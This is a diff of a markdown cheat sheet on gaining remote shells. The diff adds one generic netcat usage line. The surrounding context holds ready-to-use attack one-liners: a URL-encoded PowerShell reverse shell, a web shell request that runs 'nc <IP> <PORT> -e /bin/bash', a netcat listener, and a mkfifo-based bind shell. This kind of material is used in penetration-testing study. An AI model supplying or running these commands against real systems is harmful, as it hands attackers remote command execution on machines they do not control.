@@ -26,6 +26,7 @@ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient
 * Within the address bar enter the following. ```<LOCATION OF FILE>/shell.php?cmd=nc <IP> <PORT> -e /bin/bash```
 
 ### Netcat shells.
+```nc [options] [target address] [port(s)]```
 * Listener ```nc -lvnp <PORT> -e /bin/bash```
 * Connect via ```nc <IP> <PORT>```
 * Or for a bind shell setup this listener on victim ```mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``` then use ```nc <IP> <PORT>``` from attacking terminal.
